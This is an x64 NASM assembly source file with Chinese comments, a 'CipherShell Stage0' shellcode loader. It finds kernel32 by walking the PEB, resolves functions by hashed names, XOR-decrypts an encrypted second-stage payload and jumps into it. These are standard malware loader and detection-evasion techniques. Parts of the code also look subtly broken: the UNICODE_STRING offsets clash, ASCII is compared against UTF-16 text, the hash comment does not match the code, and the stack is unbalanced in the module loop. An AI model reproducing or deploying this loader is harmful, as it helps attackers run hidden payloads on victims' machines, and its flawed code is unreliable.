;
; CipherShell Stage0 - x64 初始解密器
; 使用 PEB 遍历获取 kernel32 基址，无导入依赖
;
; 编译命令：nasm -f win64 stage0_x64.asm -o stage0_x64.obj
;

bits 64

; ============================================================================
; 导出符号
; ============================================================================

global Stage0Entry
global GetKernel32Base
global GetProcAddressByHash

; ============================================================================
; 常量定义
; ============================================================================

%define PEB_LDR_DATA_OFFSET     0x18    ; PEB->Ldr (x64)
%define IN_MEMORY_ORDER_MODULE_LIST_OFFSET 0x20  ; LDR_DATA->InMemoryOrderModuleList

; ============================================================================
; 代码段
; ============================================================================

section .text

; ============================================================================
; Stage0Entry - 入口点
; ============================================================================
Stage0Entry:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    
    ; 获取 kernel32 基址
    call GetKernel32Base
    test rax, rax
    jz .error
    
    ; rax = kernel32.dll 基址
    mov rbp, rax
    
    ; 解密 Stage1
    ; 参数：[rsp+120] = Stage1 数据指针（15 个寄存器 * 8 字节）
    ; 参数：[rsp+128] = Stage1 大小
    ; 参数：[rsp+136] = 解密密钥指针
    mov rsi, [rsp + 120]            ; Stage1 数据指针
    mov rcx, [rsp + 128]            ; Stage1 大小
    mov rdi, [rsp + 136]            ; 解密密钥指针
    
    ; 调用解密函数
    mov r8, rdi                     ; 密钥
    mov rdx, rcx                    ; 大小
    mov rcx, rsi                    ; 数据
    call DecryptStage1
    
    ; 跳转到 Stage1
    jmp rsi
    
.error:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    xor rax, rax
    ret

; ============================================================================
; GetKernel32Base - 通过 PEB 遍历获取 kernel32.dll 基址
; 返回：rax = kernel32.dll 基址
; ============================================================================
GetKernel32Base:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    
    ; 获取 PEB 地址
    ; 方法：通过 TEB (GS:[0x60] 在 x64)
    mov rax, gs:[0x60]              ; PEB 地址
    
    ; 获取 LDR 数据
    mov rax, [rax + PEB_LDR_DATA_OFFSET]  ; PEB->Ldr
    
    ; 获取 InMemoryOrderModuleList
    mov rsi, [rax + IN_MEMORY_ORDER_MODULE_LIST_OFFSET]  ; 第一个模块
    
    ; 遍历模块列表
    ; 列表结构：LIST_ENTRY (Flink, Blink) + LDR_DATA_TABLE_ENTRY
    ; 模块基址在 LDR_DATA_TABLE_ENTRY + 0x20 (x64)
    
    mov rcx, rsi                    ; 保存列表头
    
.loop:
    ; 获取模块基址
    mov rax, [rsi + 0x20]           ; DllBase
    
    ; 检查是否为 kernel32.dll
    push rax
    push rcx
    mov rdi, rsi
    call IsKernel32
    pop rcx
    test rax, rax
    jnz .found
    
    ; 移动到下一个模块
    mov rsi, [rsi]                  ; Flink
    cmp rsi, rcx                    ; 检查是否回到列表头
    jne .loop
    
    ; 未找到
    xor rax, rax
    jmp .done
    
.found:
    ; rax 已经是 kernel32 基址（在 IsKernel32 中设置）
    
.done:
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================================================
; IsKernel32 - 检查模块是否为 kernel32.dll
; 参数：rdi = 模块列表项指针
; 返回：rax = 1 如果是 kernel32，0 如果不是
; ============================================================================
IsKernel32:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    ; 获取模块名称
    ; 在 x64 中，BaseDllName 在 LDR_DATA_TABLE_ENTRY + 0x58
    ; 但名称是 UNICODE_STRING 结构
    mov r8, [rdi + 0x58]            ; Buffer (UNICODE_STRING.Buffer)
    test r8, r8
    jz .not_kernel32
    
    ; 计算名称长度
    movzx rcx, word [rdi + 0x56]    ; Length (UNICODE_STRING.Length)
    shr rcx, 1                      ; 转换为字符数
    
    ; 比较 "kernel32.dll" (不区分大小写)
    ; 简化：只比较前几个字符
    cmp rcx, 12                     ; "kernel32.dll" = 12 字符
    jl .not_kernel32
    
    ; 比较 "k"
    cmp word [r8], 'k'
    je .check_rest
    cmp word [r8], 'K'
    jne .not_kernel32
    
.check_rest:
    ; 比较 "ernel32"
    cmp dword [r8 + 2], 'erne'
    jne .not_kernel32
    cmp dword [r8 + 6], 'l32.'
    jne .not_kernel32
    
    ; 是 kernel32.dll
    mov rax, [rdi + 0x20]           ; 返回 DllBase
    jmp .done
    
.not_kernel32:
    xor rax, rax
    
.done:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================================================
; GetProcAddressByHash - 通过哈希值获取函数地址
; 参数：rcx = 模块基址
;       edx = 函数名哈希值
; 返回：rax = 函数地址
; ============================================================================
GetProcAddressByHash:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    
    ; 保存模块基址和哈希值
    mov rsi, rcx
    mov r8d, edx
    
    ; 获取导出表 RVA
    mov eax, [rsi + 0x3C]           ; e_lfanew
    mov eax, [rsi + rax + 0x88]     ; DataDirectory[0].VirtualAddress (Export)
    test eax, eax
    jz .not_found
    
    ; 获取导出目录
    add rax, rsi                    ; 转换为 VA
    mov rdi, rax                    ; 保存导出目录指针
    
    ; 获取导出表信息
    mov ecx, [rdi + 0x18]           ; NumberOfNames
    mov edx, [rdi + 0x20]           ; AddressOfNames RVA
    add rdx, rsi                    ; 转换为 VA
    
    ; 遍历导出名称
    xor rbx, rbx                    ; 计数器
    
.name_loop:
    push rcx
    
    ; 获取名称
    mov eax, [rdx + rbx * 4]        ; Name RVA
    add rax, rsi                    ; 转换为 VA
    
    ; 计算哈希
    call HashString
    
    ; 比较哈希
    pop rcx
    cmp eax, r8d                    ; 参数中的哈希值
    je .found_name
    
    inc rbx
    loop .name_loop
    
.not_found:
    xor rax, rax
    jmp .done
    
.found_name:
    ; 获取序号
    mov eax, [rdi + 0x24]           ; AddressOfNameOrdinals RVA
    add rax, rsi
    movzx rax, word [rax + rbx * 2] ; 序号
    
    ; 获取函数地址
    mov edx, [rdi + 0x1C]           ; AddressOfFunctions RVA
    add rdx, rsi
    mov eax, [rdx + rax * 4]        ; 函数 RVA
    add rax, rsi                    ; 转换为 VA
    
.done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================================================
; HashString - 计算字符串哈希
; 参数：rax = 字符串指针
; 返回：eax = 哈希值
; ============================================================================
HashString:
    push rbx
    push rcx
    push rdx
    push rsi
    
    mov rsi, rax
    xor eax, eax                    ; 哈希值
    xor ecx, ecx                    ; 临时存储
    
.hash_loop:
    mov cl, [rsi]
    test cl, cl
    jz .hash_done
    
    ; 哈希算法：hash = hash * 33 + c
    ; 使用 ROL 5 代替乘法
    rol eax, 5
    add eax, ecx
    
    inc rsi
    jmp .hash_loop
    
.hash_done:
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================================================
; DecryptStage1 - 解密 Stage1 数据
; 参数：rcx = 数据指针
;       rdx = 数据大小
;       r8  = 密钥指针
; ============================================================================
DecryptStage1:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    mov rsi, rcx                    ; 数据指针
    mov rcx, rdx                    ; 数据大小
    mov rdi, r8                     ; 密钥指针
    
    ; 简单的 XOR 解密
    xor rbx, rbx                    ; 密钥索引
    
.decrypt_loop:
    test rcx, rcx
    jz .decrypt_done
    
    mov al, [rdi + rbx]             ; 获取密钥字节
    xor [rsi], al                   ; XOR 解密
    
    inc rsi
    inc rbx
    and rbx, 0x1F                   ; 密钥长度 32 字节
    dec rcx
    jmp .decrypt_loop
    
.decrypt_done:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret
